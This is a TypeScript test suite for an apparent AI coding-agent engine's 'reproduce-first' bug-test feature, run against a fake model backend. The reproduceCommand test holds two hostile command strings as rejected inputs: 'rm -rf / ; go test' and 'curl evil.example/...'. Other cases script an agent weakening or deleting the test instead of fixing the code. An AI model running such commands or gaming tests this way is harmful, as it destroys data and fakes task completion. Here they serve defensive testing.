// F115 reproduce-first (plan item O1): a test that must FAIL on the current code before it counts.
// Fake backend only: no model calls.

import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { after, test } from "node:test";
import { createFakeBackend } from "../src/backends/fake.ts";
import type { FakeScript } from "../src/backends/fake.ts";
import type { AgentRequest } from "../src/backends/types.ts";
import { runChecks } from "../src/checks/checks.ts";
import { resumeRun, startRun } from "../src/engine/run.ts";
import type { EngineContext } from "../src/engine/run.ts";
import { failedForTheBug, failsBeforeTheBuild, isNewProject, parseReproduce, reproduceCommand, reproducePathOk } from "../src/engine/reproduce.ts";
import { loadState } from "../src/engine/store.ts";
import type { NeuromeshEvent } from "../src/engine/store.ts";
import type { RoleChain } from "../src/engine/types.ts";
import type { Preset } from "../src/presets/presets.ts";
import { FEATURES, feature, isOn, resetFeatures } from "../src/features.ts";

const scratch = mkdtempSync(join(tmpdir(), "neuromesh-reproduce-test-"));
after(() => rmSync(scratch, { recursive: true, force: true }));
let counter = 0;

function makeRepo(files: Record<string, string>): string {
  const dir = join(scratch, `repo-${++counter}`);
  for (const [name, text] of Object.entries(files)) {
    mkdirSync(dirname(join(dir, name)), { recursive: true });
    writeFileSync(join(dir, name), text);
  }
  const git = (...args: string[]) => execFileSync("git", ["-c", "user.name=t", "-c", "user.email=t@localhost", ...args], { cwd: dir, stdio: "pipe" });
  git("init", "-q", "-b", "main");
  git("add", "-A");
  git("commit", "-q", "-m", "seed");
  return dir;
}

/** A small library with a bug: add() subtracts. Its tests run with `node --test`. */
const buggy = (): string =>
  makeRepo({
    "package.json": JSON.stringify({ name: "demo", scripts: { test: "node --test tests/" } }),
    "src/math.js": "function add(a, b) {\n  return a - b;\n}\nmodule.exports = { add };\n",
    "tests/math.test.js": "const test = require('node:test');\nconst assert = require('node:assert');\nconst { add } = require('../src/math.js');\ntest('add exists', () => assert.equal(typeof add, 'function'));\n",
  });

const BUG = "Fix the bug: add(2, 3) returns -1, it should return 5.";
const WORKER = { backend: "fake", model: "fake-worker", effort: "medium", tier: "worker" as const };
const EXPERT = { backend: "fake", model: "fake-expert", tier: "expert" as const };

function preset(roles: RoleChain = {}, extra: Partial<Preset> = {}): Preset {
  return { name: "repro", description: "", mode: "solo", roles: { worker: [WORKER], ...roles }, repairs: 1, maxTasks: 4, maxParallel: 1, turnTimeoutMinutes: 1, intake: false, brief: true, routing: "rules", advise: false, test: "no-checks", enable: ["reproduce-first"], ...extra };
}

function context(script: FakeScript) {
  const events: NeuromeshEvent[] = [];
  const fake = createFakeBackend(script);
  const home = join(scratch, `home-${++counter}`);
  const ctx: EngineContext = { home, backends: { fake }, onEvent: (e) => events.push(e), turnTimeoutMs: 5_000 };
  return { ctx, fake, events, home };
}

const props = (r: AgentRequest): Record<string, unknown> => (r.outputSchema?.properties as Record<string, unknown> | undefined) ?? {};
const isReproduce = (r: AgentRequest): boolean => "path" in props(r) && "command" in props(r);
const report = (summary: string) => ({ structured: { status: "done", summary, notes: "", run: "" } });
const write = (cwd: string, file: string, text: string): void => {
  mkdirSync(dirname(join(cwd, file)), { recursive: true });
  writeFileSync(join(cwd, file), text);
};

const HEAD = "const test = require('node:test');\nconst assert = require('node:assert');\nconst { add } = require('../src/math.js');\n";
/** What a good writer produces: asserts the behaviour the report says is right. */
const REPRO = `${HEAD}test('add adds', () => assert.equal(add(2, 3), 5));\n`;
const PATH = "tests/repro-add.test.js";
const answer = (path = PATH) => ({ structured: { path, command: "", summary: "add(2, 3) must be 5" } });
const FIXED = "function add(a, b) {\n  return a + b;\n}\nmodule.exports = { add };\n";

/** A writer with the given test, and a developer that fixes the bug on its first build. */
function script(test: string): FakeScript {
  return (req) => {
    if (isReproduce(req)) {
      write(req.cwd, PATH, test);
      return answer();
    }
    if (!("status" in props(req))) return report("n/a");
    write(req.cwd, "src/math.js", FIXED);
    return report("fixed add");
  };
}

test("F115 is registered, optional and off by default, and switched on with enable", () => {
  const f = feature("reproduce-first");
  assert.equal(f.id, "F115");
  assert.equal(f.optional, true);
  assert.equal(f.defaultOff, true);
  assert.equal(FEATURES.filter((x) => x.id === "F115").length, 1);
  resetFeatures();
  assert.equal(isOn("reproduce-first"), false);
});

test("F115: a reproduction that fails on the seed is kept, joins the checks, and the build must make it pass", async () => {
  const repo = buggy();
  const { ctx, fake, events } = context(script(REPRO));
  const state = await startRun({ cwd: repo, prompt: BUG, preset: preset() }, ctx);
  assert.equal(state.status, "finished", state.reason);
  assert.equal(state.outcome?.checks, "passed");
  assert.deepEqual(state.attempts.map((a) => a.kind), ["reproduce", "initial"], "one reproduce turn, then the build");
  const turn = fake.calls[0]!;
  assert.ok(isReproduce(turn));
  assert.equal(turn.effort, "low", "on the cheapest worker, at low effort");
  assert.equal(turn.model, "fake-worker");
  assert.equal(turn.access, "write", "with tools, so it can read the code and run its test");
  assert.match(turn.prompt, /add\(2, 3\) returns -1/);
  assert.match(turn.prompt, /ONE new test file/);
  assert.match(turn.prompt, /Change no other file/);
  assert.match(turn.prompt, /tests\/math\.test\.js/, "it is shown where the project's tests live");
  const accepted = events.find((e) => e.type === "reproduce.tests");
  assert.equal(accepted?.feature, "F115");
  assert.equal(accepted?.outcome, "accepted");
  assert.equal(accepted?.command, `node --test ${PATH}`, "the runner comes from the project's files, not from the model");
  assert.ok(state.checks.some((c) => c.name === "reproduce" && c.command === `node --test ${PATH}`), "its run command joins the task's checks");
  const build = fake.calls[1]!;
  assert.match(build.prompt, /A test reproducing the bug is at tests\/repro-add\.test\.js; make it pass without weakening it\./);
  assert.ok(state.outcome?.files.some((f) => f.path === PATH), "the test stays in the work and ships with the fix");
  assert.ok(state.outcome?.files.some((f) => f.path === "src/math.js"));
  assert.equal(readFileSync(join(state.worktree, PATH), "utf8"), REPRO);
  assert.equal(state.attempts[0]!.role, "worker");
  assert.equal(state.tasks[0]?.reproduce?.stage, "accepted");
});

test("F115: a reproduction that passes on the seed is discarded and the task goes on as if the feature were off", async () => {
  const repo = buggy();
  const passes = `${HEAD}test('add exists', () => assert.equal(add(0, 0), 0));\n`;
  const { ctx, fake, events } = context(script(passes));
  const state = await startRun({ cwd: repo, prompt: BUG, preset: preset() }, ctx);
  assert.equal(state.status, "finished", state.reason);
  assert.deepEqual(state.attempts.map((a) => a.kind), ["reproduce", "initial"]);
  assert.equal(events.find((e) => e.type === "reproduce.tests")?.outcome, "passed-on-seed");
  assert.ok(!state.checks.some((c) => c.name === "reproduce"));
  assert.doesNotMatch(fake.calls[1]!.prompt, /A test reproducing the bug/);
  assert.ok(!state.outcome?.files.some((f) => f.path === PATH), "the discarded file is not in the change");
  assert.ok(!existsSync(join(state.worktree, PATH)));
  assert.equal(state.tasks[0]?.reproduce?.stage, "rejected");
});

test("F115: a reproduction that cannot load (an import or syntax error) is discarded", async () => {
  for (const [name, text] of [["an import error", "require('../src/not-there.js');\n"], ["a syntax error", "const x = ;\n"]] as const) {
    const { ctx, events } = context(script(text));
    const state = await startRun({ cwd: buggy(), prompt: BUG, preset: preset() }, ctx);
    assert.equal(state.status, "finished", `${name}: ${state.reason}`);
    assert.equal(events.find((e) => e.type === "reproduce.tests")?.outcome, "load-error", name);
    assert.deepEqual(state.attempts.map((a) => a.kind), ["reproduce", "initial"], name);
    assert.ok(!state.checks.some((c) => c.name === "reproduce"), name);
    assert.ok(!state.outcome?.files.some((f) => f.path === PATH), name);
  }
});

test("F115: a writer that also changed a source file is discarded (the change could be what makes the test fail)", async () => {
  const { ctx, events } = context((req) => {
    if (isReproduce(req)) {
      write(req.cwd, PATH, REPRO);
      write(req.cwd, "src/math.js", "function add(a, b) {\n  return a * 0;\n}\nmodule.exports = { add };\n");
      return answer();
    }
    if (!("status" in props(req))) return report("n/a");
    write(req.cwd, "src/math.js", FIXED);
    return report("fixed");
  });
  const state = await startRun({ cwd: buggy(), prompt: BUG, preset: preset() }, ctx);
  assert.equal(state.status, "finished", state.reason);
  const e = events.find((x) => x.type === "reproduce.tests");
  assert.equal(e?.outcome, "touched-code");
  assert.deepEqual(e?.files, ["src/math.js"]);
  assert.equal(readFileSync(join(state.worktree, "src/math.js"), "utf8"), FIXED, "and its change did not reach the work");
  assert.ok(!state.checks.some((c) => c.name === "reproduce"));
});

test("F115: a build that edits the reproducing test has it put back, with an event, and still has to fix the code", async () => {
  const weak = "const test = require('node:test');\ntest('weakened', () => {});\n";
  let builds = 0;
  const { ctx, fake, events } = context((req) => {
    if (isReproduce(req)) {
      write(req.cwd, PATH, REPRO);
      return answer();
    }
    if (!("status" in props(req))) return report("n/a");
    builds += 1;
    // The first build weakens the test instead of fixing the code; the repair fixes the code.
    if (builds === 1) write(req.cwd, PATH, weak);
    else write(req.cwd, "src/math.js", FIXED);
    return report("done");
  });
  const state = await startRun({ cwd: buggy(), prompt: BUG, preset: preset() }, ctx);
  assert.equal(state.status, "finished", state.reason);
  assert.equal(state.outcome?.checks, "passed");
  assert.deepEqual(state.attempts.map((a) => a.kind), ["reproduce", "initial", "repair"], "the weakened test did not pass the task");
  const restored = events.find((e) => e.type === "reproduce.restored");
  assert.equal(restored?.feature, "F115");
  assert.equal(restored?.path, PATH);
  assert.equal(readFileSync(join(state.worktree, PATH), "utf8"), REPRO, "the shipped test is the one that was accepted");
  assert.match(fake.calls.at(-1)!.prompt, /reproduce/, "the repair is told the reproduce check fails");
  assert.equal(state.tasks[0]?.reproduce?.restored, 1);
  // A deleted test is put back too.
  const gone = context((req) => {
    if (isReproduce(req)) {
      write(req.cwd, PATH, REPRO);
      return answer();
    }
    if (!("status" in props(req))) return report("n/a");
    rmSync(join(req.cwd, PATH));
    write(req.cwd, "src/math.js", FIXED);
    return report("done");
  });
  const b = await startRun({ cwd: buggy(), prompt: BUG, preset: preset() }, gone.ctx);
  assert.equal(b.status, "finished", b.reason);
  assert.equal(gone.events.find((e) => e.type === "reproduce.restored")?.deleted, true);
  assert.equal(readFileSync(join(b.worktree, PATH), "utf8"), REPRO);
});

test("F115: off (the default), no reproduce turn is made", async () => {
  const { ctx, fake, events } = context(script(REPRO));
  const state = await startRun({ cwd: buggy(), prompt: BUG, preset: preset({}, { enable: undefined }) }, ctx);
  assert.equal(state.status, "finished", state.reason);
  assert.deepEqual(state.attempts.map((a) => a.kind), ["initial"]);
  assert.ok(!fake.calls.some(isReproduce));
  assert.ok(!events.some((e) => e.type.startsWith("reproduce.")));
  assert.ok(!state.features?.includes("reproduce-first"));
  // Enabled and then disabled, a disable wins.
  const b = context(script(REPRO));
  const s = await startRun({ cwd: buggy(), prompt: BUG, preset: preset({}, { disable: ["reproduce-first"] }) }, b.ctx);
  assert.deepEqual(s.attempts.map((a) => a.kind), ["initial"]);
});

test("F115: only a bug fix gets one (a feature, a refactor and a trivial change do not), and not without the brief", async () => {
  for (const prompt of ["Add a subtract function to the library and tests for it.", "Refactor the math module to make it easier to read.", "Fix the typo in the README."]) {
    const { ctx, fake } = context(script(REPRO));
    const state = await startRun({ cwd: buggy(), prompt, preset: preset() }, ctx);
    assert.ok(!fake.calls.some(isReproduce), prompt);
    assert.ok(!state.attempts.some((a) => a.kind === "reproduce"), prompt);
  }
  const { ctx, fake } = context(script(REPRO));
  await startRun({ cwd: buggy(), prompt: BUG, preset: preset({}, { brief: false }) }, ctx);
  assert.ok(!fake.calls.some(isReproduce), "with no brief there is no kind, and no turn");
});

test("F115: a grunt-tier task does not get one", async () => {
  const GRUNT = { backend: "fake", model: "grunt", tier: "worker" as const };
  const SENIOR = { backend: "fake", model: "senior", tier: "worker" as const };
  const { ctx, fake, events } = context((req) => {
    if (isReproduce(req)) assert.fail("the grunt's task gets no reproduction");
    if (!("status" in props(req))) return report("n/a");
    write(req.cwd, "src/math.js", FIXED);
    return report("done");
  });
  const state = await startRun(
    { cwd: buggy(), prompt: "fix the bug: the string is formatted with the wrong indentation, reformat it", preset: preset({ orchestrator: [EXPERT], escalation: [EXPERT] }, { mode: "team", routing: "worker-first", gruntLadder: [GRUNT], workerLadder: [{ ...WORKER, model: "worker" }], seniorLadder: [SENIOR], cascade: {} }) },
    ctx,
  );
  assert.equal(events.find((e) => e.type === "route.tier")?.tier, "grunt");
  assert.ok(!fake.calls.some(isReproduce));
  assert.ok(!state.attempts.some((a) => a.kind === "reproduce"));
});

test("F115: a crash, an unusable answer, or no answer costs the task nothing: it goes on as if the feature were off", async () => {
  const cases: [string, FakeScript][] = [
    ["a crash", (req) => { if (isReproduce(req)) throw new Error("the backend crashed"); return buildOnly(req); }],
    ["garbage", (req) => (isReproduce(req) ? { structured: { path: 5, summary: null } } : buildOnly(req))],
    ["text", (req) => (isReproduce(req) ? { finalText: "I could not reproduce it." } : buildOnly(req))],
    ["a path that was never written", (req) => (isReproduce(req) ? answer("tests/never-written.test.js") : buildOnly(req))],
    ["a path outside the project", (req) => { if (isReproduce(req)) { write(req.cwd, PATH, REPRO); return answer("../escape.test.js"); } return buildOnly(req); }],
    ["a path that is not a test", (req) => { if (isReproduce(req)) { write(req.cwd, "src/extra.js", "x"); return answer("src/extra.js"); } return buildOnly(req); }],
    ["an existing test file", (req) => { if (isReproduce(req)) { write(req.cwd, "tests/math.test.js", REPRO); return answer("tests/math.test.js"); } return buildOnly(req); }],
    ["a run with an error", (req) => (isReproduce(req) ? { stop: "error", detail: "boom", exitCode: 1 } : buildOnly(req))],
  ];
  for (const [name, fn] of cases) {
    const { ctx, events } = context(fn);
    const state = await startRun({ cwd: buggy(), prompt: BUG, preset: preset() }, ctx);
    assert.equal(state.status, "finished", `${name}: ${state.reason}`);
    assert.equal(state.outcome?.checks, "passed", name);
    assert.ok(state.attempts.filter((a) => a.kind === "reproduce").length <= 1, name);
    assert.deepEqual(state.attempts.filter((a) => a.kind !== "reproduce").map((a) => a.kind), ["initial"], `${name}: the build is as it would have been`);
    const e = events.find((x) => x.type === "reproduce.tests");
    assert.ok(e && e.outcome !== "accepted", `${name}: ${JSON.stringify(e)}`);
    assert.ok(!state.checks.some((c) => c.name === "reproduce"), name);
    assert.ok(!state.outcome?.files.some((f) => /repro|escape|never-written|extra/.test(f.path) || f.path === "tests/math.test.js"), `${name}: nothing of it reaches the change`);
    assert.equal(state.featureErrors?.length ?? 0, 0, `${name}: a bad answer is not a feature failure`);
  }
  function buildOnly(req: AgentRequest) {
    if (!("status" in props(req))) return report("n/a");
    write(req.cwd, "src/math.js", FIXED);
    return report("done");
  }
});

test("F115: an engine error inside the step switches the feature off for the run and the task goes on (NEUROMESH_FAULT)", async () => {
  process.env.NEUROMESH_FAULT = "reproduce-first";
  try {
    const { ctx, fake, events } = context(script(REPRO));
    const state = await startRun({ cwd: buggy(), prompt: BUG, preset: preset() }, ctx);
    assert.equal(state.status, "finished", state.reason);
    assert.equal(state.outcome?.checks, "passed");
    assert.deepEqual(state.attempts.map((a) => a.kind), ["initial"]);
    assert.ok(!fake.calls.some(isReproduce));
    const failed = events.find((e) => e.type === "feature.failed");
    assert.equal(failed?.feature, "F115");
    assert.equal(failed?.key, "reproduce-first");
    assert.equal(state.featureErrors?.[0]?.id, "F115");
    assert.match(String(failed?.message), /injected fault/);
    assert.ok(!state.checks.some((c) => c.name === "reproduce"));
    assert.equal(events.find((e) => e.type === "reproduce.tests")?.outcome, "skipped");
  } finally {
    delete process.env.NEUROMESH_FAULT;
    resetFeatures();
  }
});

test("F115: the reproduce turn is stopped with the run, and a resumed run asks again once (not twice)", async () => {
  const repo = buggy();
  const controller = new AbortController();
  let reproduces = 0;
  const first = context((req) => {
    if (isReproduce(req)) {
      reproduces += 1;
      write(req.cwd, PATH, "const half = 'written';\n");
      controller.abort();
      return new Promise(() => {});
    }
    assert.fail("no build turn before the reproduction is settled");
  });
  const stopped = await startRun({ cwd: repo, prompt: BUG, preset: preset() }, { ...first.ctx, signal: controller.signal });
  assert.equal(stopped.status, "interrupted");
  assert.equal(stopped.tasks[0]?.step, "reproduce");
  assert.equal(reproduces, 1);
  const second = context(script(REPRO));
  const state = await resumeRun(loadState(stopped.dir), second.ctx);
  assert.equal(state.status, "finished", state.reason);
  assert.equal(state.outcome?.checks, "passed");
  assert.deepEqual(state.attempts.filter((a) => a.kind === "reproduce" && a.stop === "done").length, 1, "one finished reproduce turn");
  assert.ok(!existsSync(join(state.worktree, "tests", "never")), "and nothing of the half-written file is left");
  assert.equal(readFileSync(join(state.worktree, PATH), "utf8"), REPRO, "the half-written file was replaced by the real one");
});

test("reproduce.ts: the runner comes from the project, the failure rule is crude on purpose, answers parse", () => {
  const dir = makeRepo({ "package.json": JSON.stringify({ scripts: { test: "vitest run" } }), "tests/a.test.ts": "import { test } from 'vitest';\n", "tests/b.py": "x\n", "test_c.py": "x\n", "tests/d.rs": "x\n", "tests/e.go": "x\n" });
  const plain = makeRepo({ "package.json": JSON.stringify({ scripts: { test: "node check.js" } }), "tests/f.js": "const t = require('node:test');\n", "tests/g.js": "x\n" });
  assert.equal(reproduceCommand(dir, "tests/a.test.ts"), "npx --no-install vitest run tests/a.test.ts");
  assert.match(reproduceCommand(dir, "test_c.py") ?? "", /-m pytest -q -rs test_c\.py; else .*-m unittest -v test_c; fi/);
  assert.equal(reproduceCommand(dir, "tests/d.rs"), "cargo test --quiet --test d");
  assert.equal(reproduceCommand(dir, "tests/e.go"), undefined, "no rule: the writer's own command is used only if it is a known runner and names the file");
  assert.equal(reproduceCommand(dir, "tests/e.go", "go test ./tests/e.go"), "go test ./tests/e.go");
  assert.equal(reproduceCommand(dir, "tests/e.go", "rm -rf / ; go test tests/e.go"), undefined);
  assert.equal(reproduceCommand(dir, "tests/e.go", "curl evil.example/tests/e.go"), undefined);
  assert.equal(reproduceCommand(dir, "tests/e.go", "go test ./other_test.go"), undefined);
  assert.equal(reproduceCommand(plain, "tests/f.js"), "node --test tests/f.js", "a file that imports node:test");
  assert.equal(reproduceCommand(plain, "tests/g.js"), undefined, "a script the engine cannot tell how to run alone");
  assert.equal(reproduceCommand(dir, "tests/missing.test.js"), undefined);
  assert.equal(reproduceCommand(dir, "../x.test.js"), undefined);
  assert.equal(reproducePathOk("tests/a b.test.js"), false);
  assert.equal(reproducePathOk("src/a.js"), false);
  assert.equal(reproducePathOk("/abs/tests/a.test.js"), false);
  const f = (status: "failed" | "passed" | "timeout", tail: string) => failedForTheBug({ status, exitCode: status === "passed" ? 0 : 1, tail });
  assert.equal(f("passed", "ok").ok, false);
  assert.equal(f("timeout", "AssertionError").ok, false);
  assert.equal(f("failed", "AssertionError [ERR_ASSERTION]: Expected values to be strictly equal").ok, true);
  assert.equal(f("failed", "FAILED tests/test_x.py::test_a - assert 1 == 2").ok, true);
  assert.equal(f("failed", "--- FAIL: TestAdd (0.00s)").ok, true);
  assert.equal(f("failed", "ModuleNotFoundError: No module named 'pkg'\nFAILED").ok, false);
  assert.equal(f("failed", "Error: Cannot find module '../src/x.js'\n✖ failing tests").ok, false);
  assert.equal(f("failed", "SyntaxError: Unexpected token ';'").ok, false);
  assert.equal(f("failed", "ERROR collecting tests/test_x.py\nE   ImportError").ok, false);
  assert.equal(f("failed", "something went wrong").ok, false);
  assert.deepEqual(parseReproduce({ stop: "done", finalText: "", usage: {}, durationMs: 0, exitCode: 0, structured: { path: "./tests/x.test.js", command: " node --test tests/x.test.js ", summary: "s" } }), { path: "tests/x.test.js", command: "node --test tests/x.test.js", summary: "s" });
  assert.equal(parseReproduce({ stop: "done", finalText: "", usage: {}, durationMs: 0, exitCode: 0, structured: { path: "", summary: "cannot" } }), undefined);
  assert.equal(parseReproduce({ stop: "done", finalText: "nothing", usage: {}, durationMs: 0, exitCode: 0 }), undefined);
});

test("[F133] on a new project the lead's test file may fail because the code it imports is not built yet", async () => {
  assert.equal(isNewProject([]), true);
  assert.equal(isNewProject(["README.md", "tests/test_lead_cli.py", "test/lead_cases.test.js", "notes.txt"]), true, "tests and docs are not source");
  assert.equal(isNewProject(["README.md", "src/cli.py"]), false);
  assert.equal(isNewProject(["package.json", "index.js"]), false);
  const f = (status: "failed" | "passed" | "timeout", tail: string) => failsBeforeTheBuild({ status, exitCode: status === "passed" ? 0 : 1, tail });
  assert.equal(f("failed", "ModuleNotFoundError: No module named 'todo'\nFAILED").ok, true);
  assert.equal(f("failed", "Error: Cannot find module '../src/todo.js'\n✖ failing tests").ok, true);
  assert.equal(f("failed", "error[E0432]: unresolved import `todo`").ok, true);
  assert.equal(f("failed", "AssertionError: expected 3, got 2").ok, true);
  assert.equal(f("passed", "ok").ok, false, "passes with nothing built: tests nothing");
  assert.equal(f("timeout", "ModuleNotFoundError").ok, false);
  assert.equal(f("failed", "SyntaxError: Unexpected token ';'").ok, false, "the test file itself is broken");
  assert.equal(f("failed", "IndentationError: unexpected indent").ok, false);
  assert.equal(f("failed", "something went wrong").ok, false);
  // A real node:test run on an empty project: the module the lead's file imports does not exist yet.
  const dir = makeRepo({ "README.md": "# todo\n", "test/lead_todo.test.js": "const test = require('node:test');\nconst assert = require('node:assert');\nconst { add } = require('../src/todo.js');\ntest('add', () => assert.deepEqual(add([], 'milk'), ['milk']));\n" });
  const [result] = await runChecks({ dir, checks: [{ name: "lead-tests", command: "node --test test/lead_todo.test.js" }], logDir: join(scratch, "logs"), label: "fresh" });
  assert.equal(failedForTheBug(result!).ok, false, "F124's rule drops it");
  assert.deepEqual(failsBeforeTheBuild(result!), { ok: true }, "F133 keeps it");
});

test("a check does not inherit the test runner's NODE_TEST_CONTEXT, so a `node --test` inside a check reports its own failures", async () => {
  const dir = makeRepo({ "a.test.js": "require('node:test')('fails', () => { throw new Error('boom'); });\n" });
  const [result] = await runChecks({ dir, checks: [{ name: "alone", command: "node --test a.test.js" }], logDir: join(scratch, "logs"), label: "env" });
  assert.equal(process.env.NODE_TEST_CONTEXT !== undefined, true, "this test runs under node --test");
  assert.equal(result?.status, "failed", result?.tail);
});
